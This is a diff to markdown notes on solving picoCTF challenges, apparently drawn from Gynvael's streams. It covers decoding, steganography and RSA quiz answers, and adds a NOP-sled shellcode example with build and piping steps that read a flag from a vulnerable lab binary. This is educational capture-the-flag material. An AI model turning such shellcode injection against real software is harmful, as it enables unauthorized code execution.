@@ -73,7 +73,7 @@ $ python
 or just `man ascii` 
 
 ## The Numbers - Cryptography 
-There are only numbers no larger than 26 so the numbers just stand for the index of each letter in the alphabet. Manually do it or use this script from gynvael:
+There are only numbers no larger than 26 so the numbers just stand for the index of each letter in the alphabet. Manually do it or use this script from Gynvael:
 ```
 import string
 a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -474,7 +474,7 @@ LSB (Least Significant Bit) Steganography turns out to be the solution.
 
 Data is hidden using the least significant bit. E.g. for a color 0x31708f, the f could be changed to a b to store data. The small change in color is not really noticeable.
 
-Use an online [decoder](https://stylesuxx.github.io/steganography/). If you've never implemented LSB steg, then that's another thing you should implement according to gynvael.
+Use an online [decoder](https://stylesuxx.github.io/steganography/). If you've never implemented LSB steg, then that's another thing you should implement according to Gynvael.
 
 ## Extensions - Forensics
 ```
@@ -678,7 +678,7 @@ Today we will be taking a pop quiz, so I hope you studied. Cramming just will no
 You will need to tell me if each example is possible, given your extensive crypto knowledge.
 Inputs and outputs are in decimal. No hex here!
 ```
-### Question 1:
+#### Question 1:
 ```
 #### NEW PROBLEM ####
 q : 60413
@@ -701,7 +701,7 @@ $ python
 4636878989
 ```
 
-### Question 2: 
+#### Question 2: 
 ```
 #### NEW PROBLEM ####
 p : 54269
@@ -721,7 +721,7 @@ $ python
 93089
 ```
 
-### Question 3:
+#### Question 3:
 ```
 #### NEW PROBLEM ####
 e : 3
@@ -734,7 +734,7 @@ IS THIS POSSIBLE and FEASIBLE? (Y/N):n
 
 n is quite large (2049 bytes), so factoring n to try and get the prime numbers (p and q) would be take way too long. There's no fast way to factor n. 
 
-### Question 4:
+#### Question 4:
 ```
 #### NEW PROBLEM ####
 q : 66347
@@ -754,7 +754,7 @@ $ python
 ```
 
 
-### Question 5:
+#### Question 5:
 ```
 #### NEW PROBLEM ####
 plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
@@ -777,7 +777,7 @@ $ python
 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813L
 ```
 
-### Question 6:
+#### Question 6:
 ```
 #### NEW PROBLEM ####
 ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
@@ -789,7 +789,7 @@ IS THIS POSSIBLE and FEASIBLE? (Y/N):n
 ```
 You need the private key, d, to get the plaintext. And in order to get d, you need q and p, but we only have n and e.
 
-### Question 7:
+#### Question 7:
 
 Use python
 ```
@@ -804,7 +804,7 @@ $ python
 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729L
 ```
 
-### Question 8:
+#### Question 8:
 ```
 #### NEW PROBLEM ####
 p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
@@ -902,6 +902,7 @@ System is not in the binary unfortunately, but fopen is, so we can use it to ope
 Shellcode:
 
 ```
+[bits 32]
 times 256 nop ; makes a nop sled with 256 nop instructions
 
 ; the call instruction pushes the next 'instruction' onto the stack 
@@ -929,23 +930,36 @@ n1:
   mov eax, 0x8050320 ; puts address
   call eax
 
+  nop
  
 ```
 Save above shellcode as a file like asdf.asm and then compile
 ```
 $ nasm asdf.asm
 ```
+This produces a binary called asdf
+
+To pass the shellcode as input to the program:
+```
+$ cat ~/asdf | ./vuln
+
+Enter your shellcode:
+Thanks! Executing from a random location now...
+picoCTF{sl1pp3ry_sh311c0d3_3d79d4df}
+Segmentation fault (core dumped)
+```
+For an actual ctf, Gynvael recommends not writing your own shellcode due to time constraints.
 
 
-
-## Random other stuff gynvael says about solving ctf challenges during the stream
+## Random other stuff Gynvael says about solving ctf challenges during the stream
 * He recommends kaitai struct for stegno challenges (Part 1: 46:39)
 * Recommends pdfstreamdumper
 * Thumbnails can store info
 * For network dumps there are two main tools: Wireshark and NetworkMiner
 
 ## TODO 
-Fix all the weird non ascii apostrophes and double quotes
+* Fix all the weird non ascii apostrophes and double quotes
+* Probably syntax highlighting for some of the code snippets
 
 
 
